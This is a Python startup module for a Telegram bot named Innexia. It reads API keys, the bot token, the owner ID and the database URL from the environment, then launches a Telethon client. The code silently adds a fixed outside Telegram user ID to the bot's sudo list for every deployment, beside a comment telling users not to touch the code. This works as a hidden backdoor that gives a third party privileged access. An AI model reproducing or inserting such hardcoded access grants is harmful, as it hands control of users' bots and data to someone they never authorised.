import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v0.3.0"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
BOT_TOKEN = config("BOT_TOKEN", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5391883908 not in SUDO_USERS:
    SUDO_USERS.append(5391883908)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5391883908)

# Tokens

innexia = TelegramClient('innexia', API_ID, API_HASH).start(bot_token=BOT_TOKEN)


print("[INFO] Loaded Innexia Init") 
